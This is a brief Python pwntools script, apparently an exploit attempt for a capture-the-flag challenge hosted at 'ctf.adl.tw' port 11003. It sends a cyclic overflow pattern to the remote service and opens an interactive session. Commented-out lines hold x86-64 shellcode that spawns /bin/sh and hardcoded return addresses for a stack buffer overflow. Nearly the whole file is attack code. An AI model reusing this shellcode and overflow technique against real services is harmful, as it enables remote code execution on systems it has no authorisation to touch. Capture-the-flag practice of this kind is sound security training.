from pwn import *
import struct

# print(cyclic(1000))

ip = 'ctf.adl.tw'
port = 11003

r = remote(ip, port)
payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
# shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# payload += p64(0x7ffff7f7ccee)
# payload += p64(0x7ffff7f7ccee)
# payload += shell


r.sendline(payload)
r.interactive()

